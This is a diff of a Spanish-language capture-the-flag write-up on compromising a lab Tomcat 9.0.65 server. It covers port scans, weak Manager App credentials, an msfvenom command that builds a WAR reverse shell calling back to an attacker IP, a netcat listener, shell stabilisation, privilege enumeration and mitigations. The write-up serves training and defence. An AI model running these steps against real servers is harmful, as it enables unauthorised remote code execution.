@@ -10,7 +10,7 @@
 
 ## Resumen del Ataque
 
-La máquina expone una instancia de Apache Tomcat 9.0.65 (puerto 8080/tcp). Se localiza el panel **Manager App**, protegido con autenticación básica, y se identifican credenciales válidas (`tomcat:s3cr3t`) mediante contraseñas comunes/débiles asociadas a este servicio. Con acceso al Manager App se genera un archivo WAR malicioso con `msfvenom` conteniendo una reverse shell en Java, que se despliega a través del panel de administración. Al acceder a la aplicación desplegada se obtiene ejecución de comandos como el usuario `tomcat`. Tras estabilizar la shell y enumerar el sistema, no se encuentran vectores clásicos de escalada de privilegios (sin `sudo`, sin binarios SUID explotables), pero se localiza la flag directamente en el directorio de trabajo del servicio, accesible con los privilegios del propio usuario `tomcat`.
+La máquina expone una instancia de Apache Tomcat 9.0.65 (puerto 8080/tcp). Se localiza el panel **Manager App**, protegido con autenticación básica, y se identifican credenciales válidas (`tomcat:s3cr3t`) mediante contraseñas comunes/débiles asociadas a este servicio. Con acceso al Manager App se genera un archivo WAR malicioso con `msfvenom` conteniendo una reverse shell en Java, que se despliega a través del panel de administración. Al acceder a la aplicación desplegada se obtiene ejecución de comandos como el usuario `tomcat`. Tras estabilizar la shell y enumerar el sistema, no se encuentran vectores clásicos de escalada de privilegios (sin `sudo`, sin binarios SUID explotables), pero se localiza la flag directamente en el directorio de trabajo del servicio, accesible con los privilegios del propio usuario `tomcat`.
 
 ## Técnicas Usadas
 
@@ -21,7 +21,7 @@ La máquina expone una instancia de Apache Tomcat 9.0.65 (puerto 8080/tcp). Se l
 - Generación de payload WAR con reverse shell Java (`msfvenom`)
 - Despliegue de aplicación maliciosa vía Manager App
 - Obtención de reverse shell vía Netcat
-- Estabilización de shell (`script` + `stty`)
+- Estabilización de shell (`script` + `stty`)
 - Enumeración de privilegios (sudo, binarios SUID)
 - Búsqueda dirigida de archivos de flag
 
@@ -29,23 +29,23 @@ La máquina expone una instancia de Apache Tomcat 9.0.65 (puerto 8080/tcp). Se l
 
 ### 1. Escaneo inicial de puertos
 
-```bash
+```shell
 nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 172.17.0.2
 ```
 
 Resultado:
 
-![[{{noteName}}-image-14.png]]
+![](images/IMG-20260711111754041.png)
 
 Único puerto abierto: 8080/tcp.
 
 ### 2. Escaneo de versión y scripts
 
-```bash
+```shell
 nmap -p 8080 -sC -sV -oN allports 172.17.0.2
 ```
 
-![[{{noteName}}-image-15.png]]
+![](images/IMG-20260711111827630.png)
 
 Se confirma Apache Tomcat 9.0.65 sirviendo la página por defecto.
 
@@ -55,9 +55,11 @@ Se confirma Apache Tomcat 9.0.65 sirviendo la página por defecto.
 http://172.17.0.2:8080/
 ```
 
-![[{{noteName}}-image-16.png]]
+![](images/IMG-20260711111915720.png)
 
-Desde la página de inicio por defecto de Tomcat se accede al enlace **Manager App**, protegido con autenticación básica HTTP.
+Desde la página de inicio por defecto de Tomcat se accede al enlace **Manager App**, protegido con autenticación básica HTTP.
+
+![](images/IMG-20260711111942936.png)
 
 ### 4. Prueba de credenciales
 
@@ -67,10 +69,13 @@ Se prueban combinaciones de credenciales comunes asociadas al Manager App de Tom
 tomcat:s3cr3t
 ```
 
-![[{{noteName}}-image-17.png]]
+![](images/IMG-20260711112117645.png)
+
+![](images/IMG-20260711112420991.png)
+
 ### 5. Generación del payload WAR
 
-```bash
+```shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=1234 -f war -o revshell.war
 ```
 
@@ -80,24 +85,23 @@ Se genera un archivo WAR con una reverse shell en Java apuntando a la IP y puert
 
 Con el listener en escucha:
 
-```bash
+```shell
 nc -lvnp 1234
 ```
 
-Se sube y despliega el archivo `revshell.war` desde el propio panel Manager App (sección de despliegue de WAR). Tras acceder a la ruta de la aplicación desplegada (`/revshell/`), se dispara la reverse shell y se recibe la conexión en el listener.
+Se sube y despliega el archivo `revshell.war` desde el propio panel Manager App (sección de despliegue de WAR). Tras acceder a la ruta de la aplicación desplegada (`/revshell/`), se dispara la reverse shell y se recibe la conexión en el listener.
 
-![[{{noteName}}-image-18.png]]
+![](images/IMG-20260711112519972.png)
 
-![[{{noteName}}-image-19.png]]
-
+![](images/IMG-20260711112553100.png)
 
 ### 7. Estabilización de la shell
 
-```bash
+```shell
 script /dev/null -c bash
 ```
 
-```bash
+```shell
 # Ctrl+Z
 stty raw -echo; fg
 reset xterm
@@ -106,73 +110,73 @@ export SHELL=bash
 stty rows 33 columns 144
 ```
 
-```bash
+```shell
 tomcat@tomcat:~$ whoami
 ```
 
-![[{{noteName}}-image-20.png]]
+![](images/IMG-20260711112725361.png)
 
-Shell estable como usuario `tomcat`.
+Shell estable como usuario `tomcat`.
 
 ### 8. Enumeración de usuarios
 
-```bash
+```shell
 grep bash /etc/passwd
 ```
 
-![[{{noteName}}-image-21.png]]
+![](images/IMG-20260711112756547.png)
 
 ### 9. Verificación de privilegios sudo
 
-```bash
+```shell
 sudo -l
 ```
 
-![[{{noteName}}-image-22.png]]
+![](images/IMG-20260711112825900.png)
 
-`sudo` no está disponible en el sistema.
+`sudo` no está disponible en el sistema.
 
 ### 10. Enumeración de binarios SUID
 
-```bash
+```shell
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![[{{noteName}}-image-23.png]]
+![](images/IMG-20260711112905216.png)
 
 Ningún binario SUID explotable presente; todos corresponden a utilidades estándar del sistema sin vector de escalada directo.
 
 ### 11. Búsqueda dirigida de la flag
 
-```bash
+```shell
 find / -name "flag.txt" -o -name "flag" -o -name "*.flag" 2>/dev/null
 ```
 
-![[{{noteName}}-image-24.png]]
+![](images/IMG-20260711112937717.png)
 
-La flag se encuentra directamente accesible dentro del directorio de trabajo del propio usuario `tomcat` (`/opt/tomcat`), sin necesidad de escalar privilegios.
+La flag se encuentra directamente accesible dentro del directorio de trabajo del propio usuario `tomcat` (`/opt/tomcat`), sin necesidad de escalar privilegios.
 
 ### 12. Captura de la flag
 
-```bash
+```shell
 cat /opt/tomcat/flag.txt
 ```
 
-![[{{noteName}}-image-25.png]]
+![](images/IMG-20260711113010326.png)
 
 ## Lecciones Aprendidas
 
 - El Manager App de Tomcat es un objetivo de alto valor: con credenciales válidas permite ejecución de código directa mediante despliegue de archivos WAR.
 - Las credenciales por defecto o débiles (`tomcat:s3cr3t`) siguen siendo un vector de compromiso real en servicios de administración expuestos.
-- `msfvenom` facilita la generación de payloads WAR listos para desplegar sin necesidad de escribir código Java/JSP manualmente.
+- `msfvenom` facilita la generación de payloads WAR listos para desplegar sin necesidad de escribir código Java/JSP manualmente.
 - No siempre es necesario escalar privilegios a nivel de sistema (root) para completar un objetivo: en este caso, la flag era accesible directamente con los privilegios del usuario de servicio comprometido (`tomcat`).
 - Ante la ausencia de vectores clásicos de privesc (sudo, SUID), conviene ampliar la búsqueda a directorios de aplicación y de trabajo del servicio comprometido, donde a menudo quedan datos sensibles.
 
 ## Medidas de Mitigación
 
-- Eliminar o restringir el acceso al Manager App de Tomcat en entornos de producción; si es necesario, limitarlo por IP mediante `RemoteAddrValve`.
-- Cambiar las credenciales por defecto de `tomcat-users.xml` por contraseñas fuertes y únicas.
-- Aplicar principio de mínimo privilegio a los roles definidos en `tomcat-users.xml` (evitar `manager-gui`/`manager-script` salvo necesidad estricta).
+- Eliminar o restringir el acceso al Manager App de Tomcat en entornos de producción; si es necesario, limitarlo por IP mediante `RemoteAddrValve`.
+- Cambiar las credenciales por defecto de `tomcat-users.xml` por contraseñas fuertes y únicas.
+- Aplicar principio de mínimo privilegio a los roles definidos en `tomcat-users.xml` (evitar `manager-gui`/`manager-script` salvo necesidad estricta).
 - Ejecutar el servicio Tomcat con un usuario dedicado sin privilegios adicionales, y evitar almacenar información sensible en su directorio de trabajo.
-- Monitorizar despliegues de aplicaciones WAR no autorizados y alertas de acceso al endpoint `/manager`.
+- Monitorizar despliegues de aplicaciones WAR no autorizados y alertas de acceso al endpoint `/manager`.
 - Mantener Tomcat actualizado y revisar periódicamente los logs de acceso al panel de administración.
